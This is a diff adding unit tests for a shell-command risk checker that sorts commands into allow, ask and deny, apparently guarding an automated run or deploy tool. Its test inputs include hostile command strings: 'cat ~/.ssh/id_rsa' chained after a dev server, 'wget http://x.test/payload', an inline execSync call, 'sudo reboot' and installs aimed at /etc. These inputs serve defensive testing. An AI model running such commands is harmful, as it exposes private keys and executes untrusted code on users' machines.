@@ -73,3 +73,62 @@ describe('isOwnDeployProcess', () => {
     expect(isOwnDeployProcess('', roots)).toBe(false);
   });
 });
+
+describe('审查修复：命令分隔符 / 内联代码 / 全局安装', () => {
+  it.each([
+    'npm run dev & unknownbin --x',
+    'npm run dev & cat ~/.ssh/id_rsa',
+    'npm run dev\nunknownbin --x',
+    'npm run dev\r\nunknownbin --x',
+    'PORT=3000 npm run dev & wget http://x.test/payload',
+  ])('单个 & 与换行也是分隔符，后面的命令要单独评估: %j', (cmd) => {
+    expect(assessRunCommand(cmd).action).toBe('ask');
+  });
+
+  it('分隔符后面是破坏性命令仍直接拒绝', () => {
+    expect(assessRunCommand('npm run dev & sudo reboot').action).toBe('deny');
+    expect(assessRunCommand('npm run dev\nsudo reboot').action).toBe('deny');
+  });
+
+  it.each([
+    'node -e "require(\'child_process\').execSync(\'id\')"',
+    'node --eval "1+1"',
+    'python3 -c "print(1)"',
+    'tsx -e "console.log(1)"',
+    'npx some-unvetted-pkg',
+    'pnpx cowsay hi',
+    'bunx evil-pkg --x',
+    'npx',
+  ])('内联代码 / 未知 npx 包需要人工确认: %s', (cmd) => {
+    expect(assessRunCommand(cmd).action).toBe('ask');
+  });
+
+  it.each(['node server.js', 'node --watch server.js', 'python3 -m http.server 8000', 'npx vite --port 5173', 'npx --yes serve -s dist', 'pnpx vite', 'tsx watch src/index.ts', 'ts-node src/server.ts'])(
+    '常见的开发服务器启动方式不受影响: %s',
+    (cmd) => {
+      expect(assessRunCommand(cmd).action).toBe('allow');
+    },
+  );
+
+  it.each([
+    ['npm', ['install', '-g', 'pkg']],
+    ['npm', ['install', '--global', 'pkg']],
+    ['npm', ['i', '--prefix', '/etc', 'x']],
+    ['npm', ['install', '--prefix=/etc', 'x']],
+    ['npm', ['install', '--location=global', 'x']],
+    ['pnpm', ['add', '-g', 'pkg']],
+    ['pnpm', ['add', '--global', 'pkg']],
+    ['yarn', ['global', 'add', 'pkg']],
+    ['npm', ['-C', '/etc', 'install']],
+  ])('全局 / 外部目录安装需要人工确认: %s %j', (command, args) => {
+    const v = assessShell({ command, args });
+    expect(v.action).toBe('ask');
+    expect(v.risk).toBe('high');
+  });
+
+  it('普通的本地安装与带无关参数的安装仍放行', () => {
+    expect(assessShell({ command: 'npm', args: ['install', '--no-audit', '--no-fund'] }).action).toBe('allow');
+    expect(assessShell({ command: 'pnpm', args: ['install', '--prefer-offline'] }).action).toBe('allow');
+    expect(assessShell({ command: 'npm', args: ['install', '--save-dev', 'vite'] }).action).toBe('allow');
+  });
+});
